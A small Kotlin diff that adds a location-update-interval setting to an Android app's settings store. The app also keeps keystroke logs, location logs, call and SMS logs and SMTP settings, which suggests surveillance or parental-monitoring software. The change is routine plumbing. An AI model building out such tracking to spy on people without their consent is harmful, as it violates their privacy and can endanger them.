@@ -113,6 +113,7 @@ class SettingsRepository(private val context: Context) {
         val SMTP_PORT = stringPreferencesKey("smtp_port")
         val ACCESSIBILITY_WATCHDOG_STALE_MINUTES = intPreferencesKey("accessibility_watchdog_stale_minutes")
         val SAFE_ZONE_CHECK_INTERVAL_SECONDS = intPreferencesKey("safe_zone_check_interval_seconds")
+        val LOCATION_UPDATE_INTERVAL_SECONDS = intPreferencesKey("location_update_interval_seconds")
         val KEYSTROKE_LOG_RETENTION_COUNT = intPreferencesKey("keystroke_log_retention_count")
         val LOCATION_LOG_RETENTION_COUNT = intPreferencesKey("location_log_retention_count")
         val CALL_SMS_LOG_MAX_ENTRIES = intPreferencesKey("call_sms_log_max_entries")
@@ -211,6 +212,7 @@ class SettingsRepository(private val context: Context) {
             smtpPort = prefs[Keys.SMTP_PORT] ?: defaults.smtpPort,
             accessibilityWatchdogStaleMinutes = prefs[Keys.ACCESSIBILITY_WATCHDOG_STALE_MINUTES] ?: defaults.accessibilityWatchdogStaleMinutes,
             safeZoneCheckIntervalSeconds = prefs[Keys.SAFE_ZONE_CHECK_INTERVAL_SECONDS] ?: defaults.safeZoneCheckIntervalSeconds,
+            locationUpdateIntervalSeconds = prefs[Keys.LOCATION_UPDATE_INTERVAL_SECONDS] ?: defaults.locationUpdateIntervalSeconds,
             keystrokeLogRetentionCount = prefs[Keys.KEYSTROKE_LOG_RETENTION_COUNT] ?: defaults.keystrokeLogRetentionCount,
             locationLogRetentionCount = prefs[Keys.LOCATION_LOG_RETENTION_COUNT] ?: defaults.locationLogRetentionCount,
             callSmsLogMaxEntries = prefs[Keys.CALL_SMS_LOG_MAX_ENTRIES] ?: defaults.callSmsLogMaxEntries,
@@ -295,6 +297,7 @@ class SettingsRepository(private val context: Context) {
             prefs[Keys.SMTP_PORT] = cfg.smtpPort
             prefs[Keys.ACCESSIBILITY_WATCHDOG_STALE_MINUTES] = cfg.accessibilityWatchdogStaleMinutes
             prefs[Keys.SAFE_ZONE_CHECK_INTERVAL_SECONDS] = cfg.safeZoneCheckIntervalSeconds
+            prefs[Keys.LOCATION_UPDATE_INTERVAL_SECONDS] = cfg.locationUpdateIntervalSeconds
             prefs[Keys.KEYSTROKE_LOG_RETENTION_COUNT] = cfg.keystrokeLogRetentionCount
             prefs[Keys.LOCATION_LOG_RETENTION_COUNT] = cfg.locationLogRetentionCount
             prefs[Keys.CALL_SMS_LOG_MAX_ENTRIES] = cfg.callSmsLogMaxEntries
